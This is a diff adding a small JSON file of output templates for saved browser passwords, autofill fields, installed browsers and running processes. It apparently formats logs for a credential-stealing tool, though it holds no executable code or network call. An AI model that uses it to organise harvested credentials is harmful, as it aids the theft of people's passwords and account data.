@@ -1,0 +1,6 @@
+{
+  "autofill_entry": "Field: {field} | Value: {value}",
+  "password_entry": "URL: {url}\nUsername: {username}\nPassword: {password}\nApplication: {application}\n",
+  "installed_browser_entry": "{number}) {name} | Path: {path} | Version: {version}",
+  "process_entry": "ID: [{id}]\nName: [{name}]\nCommandLine: [{cmdline}]\n"
+}
